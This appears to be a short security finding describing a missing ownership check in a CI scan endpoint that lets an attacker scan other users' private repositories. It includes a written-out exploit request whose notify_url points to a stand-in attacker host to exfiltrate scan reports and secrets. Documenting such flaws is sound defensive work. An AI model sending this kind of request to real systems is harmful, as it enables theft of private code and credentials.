diagnosis: The endpoint passes repo_id to a background task that clones the private repository using stored SSH deploy keys and sends analysis reports to notify_url. Without validating repo ownership, an attacker can trigger scans of private repos and exfiltrate secrets via the webhook.
exploit_request:
POST /api/ci/scan/ HTTP/1.1
Host: ci.example.com
Authorization: Bearer <attacker_jwt>
Content-Type: application/json

{"repo_id": 402, "notify_url": "https://attacker.com/leak"}
